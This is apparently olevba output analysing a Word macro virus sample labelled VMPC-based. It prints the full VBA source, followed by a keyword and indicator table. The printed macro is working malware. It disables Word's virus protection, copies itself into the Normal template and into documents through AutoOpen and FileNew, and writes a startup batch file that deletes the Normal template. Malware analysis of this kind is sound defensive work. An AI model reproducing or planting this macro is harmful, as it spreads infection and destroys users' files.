olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-a32b89b03ee29dfb5bf278dedb3217edf3e1b28e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-a32b89b03ee29dfb5bf278dedb3217edf3e1b28e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul1.bas 
in file: Virus.MSWord.VMPC-based-a32b89b03ee29dfb5bf278dedb3217edf3e1b28e - OLE stream: 'Macros/VBA/Modul1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
    
    
Sub test1()
  
On Error Resume Next
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Application.VBE.ActiveVBProject.VBComponents("test1").Export "c:\test1.sys"
ActiveDocument.ReadOnlyRecommended = False
 f1410$ = "c:\windows\startm~1\programs\startup\msfile.bat"
e55785993 = GetAttr(NormalTemplate.FullName)
If e55785993 = vbReadOnly And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(f1410$)
If e55785993 = vbReadOnly + vbArchive And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(f1410$)
If e55785993 = vbReadOnly Then GoTo fuckoff
If e55785993 = vbReadOnly + vbArchive Then GoTo fuckoff
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "test1" Then cy599313378 = True
Next I
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "test1" Then ll013375 = True
Next I
If cy599313378 = True And ll013375 = False Then Set u133759933 = NormalTemplate.VBProject.VBComponents
If cy599313378 = False And ll013375 = True Then Set u133759933 = ActiveDocument.VBProject.VBComponents
u133759933.import "c:\test1.sys"
If cy599313378 = False And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If ll013375 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
fuckoff:
End Sub
Sub FileNew()
    On Error Resume Next
    Call test1
Dialogs(wdDialogFileNew).Show
    Skip = 1
    Call test1
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call test1
End Sub
Sub ToolsMacro()
    On Error Resume Next
End Sub
Sub FileTemplates()
    On Error Resume Next
End Sub
Sub ViewVBCode()
    On Error Resume Next
End Sub
    
Sub vBitchES(strFile As String)
    
Dim hFile As Long
On Error Resume Next
n$ = NormalTemplate
Part11$ = "attrib -h -r "
snag$ = "c:\progra~1\micros~1\templa~1\"
snag1$ = "c:\progra~1\micros~2\templa~1\"
Part2$ = "del "
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, Part11$ + snag$ + n$
Print #hFile, Part11$ + snag1$ + n$
Print #hFile, Part2$ + snag$ + n$
Print #hFile, Part2$ + snag1$ + n$
Print #hFile, "cls"
Print #hFile, Part2$ + "c:\windows\startm~1\programs\startup\msfile.bat"
Close hFile
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |msfile.bat          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

